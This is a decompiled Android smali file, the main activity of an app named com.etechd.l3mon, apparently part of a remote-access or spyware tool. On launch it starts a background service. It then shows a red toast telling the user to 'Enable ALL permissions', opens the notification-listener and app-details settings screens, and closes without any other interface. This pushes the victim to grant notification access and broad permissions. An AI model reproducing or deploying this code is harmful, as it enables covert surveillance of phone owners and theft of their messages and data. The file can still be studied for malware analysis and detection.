.class public Lcom/etechd/l3mon/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 17
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method private isNotificationServiceRunning()Z
    .locals 4

    .line 54
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 55
    .local v0, "contentResolver":Landroid/content/ContentResolver;
    nop

    .line 56
    const-string v1, "enabled_notification_listeners"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 57
    .local v1, "enabledNotificationListeners":Ljava/lang/String;
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    .line 58
    .local v2, "packageName":Ljava/lang/String;
    if-eqz v1, :cond_0

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    const/4 v3, 0x1

    goto :goto_0

    :cond_0
    const/4 v3, 0x0

    :goto_0
    return v3
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 21
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 23
    const/high16 v0, 0x7f040000

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->setContentView(I)V

    .line 24
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/etechd/l3mon/MainService;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 25
    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z

    move-result v0

    .line 26
    .local v0, "isNotificationServiceRunning":Z
    if-nez v0, :cond_0

    .line 28
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 29
    .local v1, "context":Landroid/content/Context;
    const-string v2, "Click \'Permissions\'\nEnable ALL permissions\n Click back x2\n Enable \'Package Manager\'"

    .line 30
    .local v2, "text":Ljava/lang/CharSequence;
    const/4 v3, 0x1

    .line 32
    .local v3, "duration":I
    invoke-static {v1, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v4

    .line 34
    .local v4, "toast":Landroid/widget/Toast;
    invoke-virtual {v4}, Landroid/widget/Toast;->getView()Landroid/view/View;

    move-result-object v5

    const v6, 0x102000b

    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/TextView;

    .line 35
    .local v5, "v":Landroid/widget/TextView;
    const/high16 v6, -0x10000

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setTextColor(I)V

    .line 36
    sget-object v6, Landroid/graphics/Typeface;->DEFAULT_BOLD:Landroid/graphics/Typeface;

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;)V

    .line 37
    const/16 v6, 0x11

    invoke-virtual {v5, v6}, Landroid/widget/TextView;->setGravity(I)V

    .line 38
    invoke-virtual {v4}, Landroid/widget/Toast;->show()V

    .line 41
    new-instance v6, Landroid/content/Intent;

    const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    invoke-direct {v6, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v6}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 44
    new-instance v6, Landroid/content/Intent;

    const-string v7, "package:com.etechd.l3mon"

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"

    invoke-direct {v6, v8, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 45
    .local v6, "i":Landroid/content/Intent;
    invoke-virtual {p0, v6}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V

    .line 48
    .end local v1    # "context":Landroid/content/Context;
    .end local v2    # "text":Ljava/lang/CharSequence;
    .end local v3    # "duration":I
    .end local v4    # "toast":Landroid/widget/Toast;
    .end local v5    # "v":Landroid/widget/TextView;
    .end local v6    # "i":Landroid/content/Intent;
    :cond_0
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V

    .line 49
    return-void
.end method
